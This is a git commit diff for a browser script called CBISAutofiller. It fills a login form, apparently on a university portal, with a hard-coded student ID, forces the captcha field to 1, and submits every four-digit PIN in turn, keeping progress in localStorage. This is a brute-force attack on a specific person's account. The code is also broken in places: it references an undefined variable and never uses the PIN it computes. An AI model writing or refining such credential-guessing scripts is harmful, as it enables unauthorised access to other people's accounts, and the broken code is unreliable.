3c60be26941ed4d877799941598810721abed5b2
rafliyulistiawan <rafliyulistiawan@gmail.com>
2023-01-06 01:06:19 +0700

    gabut lagi

--- js/CBISAutofiller/app.js
+++ js/CBISAutofiller/app.js
@@ -1,23 +1,32 @@
-window.addEventListener('DOMContentLoaded', () => {
-  const nimEl = document.querySelector("input[name='user_id']");
-  const pinEl = document.querySelector("input[name='pwd0']");
-  const form = document.querySelector('form');
+const STORAGE_KEY = 'PIN';
+const nimEl = document.querySelector("input[name='user_id']");
+const pinEl = document.querySelector("input[name='pwd0']");
+const captcha = document.querySelector("input[name='fcaptcha']");
+const form = document.querySelector('form');
 
-  console.log(nimEl);
+let i = localStorage.getItem(STORAGE_KEY);
+if (!i) i = 0;
 
-  if (nimEl) {
-    let pin;
-    const nim = (nimEl.value = 123210166);
-    for (let i = 0; i < 10000; i++) {
-      if (i < 10) pin = '000' + i;
-      else if (i < 100) pin = '00' + i;
-      else if (i < 1000) pin = '0' + i;
-      else pin = i;
+if (nimEl) {
+  let pin;
+  nimEl.value = 123210166;
+  captcha.value = 1;
 
-      pinEl.value = pin;
-      form.submit();
-    }
-  } else {
-    console.log('error');
-  }
-});
+  if (i < 10) pin = '000' + i;
+  else if (i < 100) pin = '00' + i;
+  else if (i < 1000) pin = '0' + i;
+  else pin = i;
+
+  pinEl.value = localStorage.getItem(STORAGE_KEY);
+  form.submit();
+} else {
+  i++;
+  console.log('error');
+}
+
+if (typeof Storage !== undefined) {
+  localStorage.setItem(STORAGE_KEY, parsedData);
+}
+console.log(pin);
+
+const urlList = ['login.html', 'menu01.html?login=fail'];
